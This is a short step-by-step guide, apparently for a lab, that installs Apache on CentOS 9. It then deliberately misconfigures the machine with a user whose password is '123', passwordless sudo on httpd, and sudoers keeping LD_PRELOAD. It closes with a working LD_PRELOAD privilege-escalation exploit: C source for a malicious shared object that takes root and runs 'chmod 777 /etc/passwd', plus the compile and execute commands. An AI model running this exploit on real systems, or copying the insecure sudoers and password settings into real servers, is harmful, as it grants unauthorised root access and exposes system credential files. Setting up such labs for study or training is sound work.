# Apache Setup and Privilege Escalation on CentOS 9

## Step 1: Install Apache
```
yum install httpd -y
```

## Step 2: Start and Enable Apache Service
```
systemctl start httpd
systemctl enable httpd
```

## Step 3: Create a User for Apache Management
```
useradd -m site-admin -s /bin/bash
```

## Step 4: Grant sudo Permissions to site-admin

   Edit the sudoers file:
```
nano /etc/sudoers
```
  Add the following line:
```
site-admin  ALL=(ALL)   NOPASSWD: /usr/sbin/httpd
```

   ## Step 5: Set Password Using chpasswd
```
echo 'site-admin:123' | chpasswd
```
## Step 6: Modify sudoers File for LD_PRELOAD
  Add this line to /etc/sudoers:
```
Defaults env_keep += "LD_PRELOAD"
```
 ## Step 7: SSH into the Machine and Test Apache
  ```
  ssh site-admin@192.168.1.10
  ```
  
  Run Apache commands:
```
sudo /usr/sbin/httpd
sudo /usr/sbin/httpd -v
sudo /usr/sbin/httpd -T
```

## Step 8: Privilege Escalation via LD_PRELOAD
### Create a Malicious Shared Object (evil.c)
```
 #include <stdio.h>
 #include <stdlib.h>

void _init() {
        setuid(0);
        setgid(0);
        system("chmod 777 /etc/passwd");
}
```

### Compile and Generate Shared Object
```
gcc -fPIC -shared -o /tmp/env.so /tmp/evil.c -nostartfiles
```
### Execute the Exploit
```
sudo LD_PRELOAD=/tmp/env.so /usr/sbin/httpd
```
## Step 9: Locate Shared Object Files
```
find /lib /lib64 /usr/lib /usr/lib64 -name "*.so*"
```


This guide covers Apache installation, user management, sudo permissions, and an LD_PRELOAD privilege escalation exploit on CentOS 9.
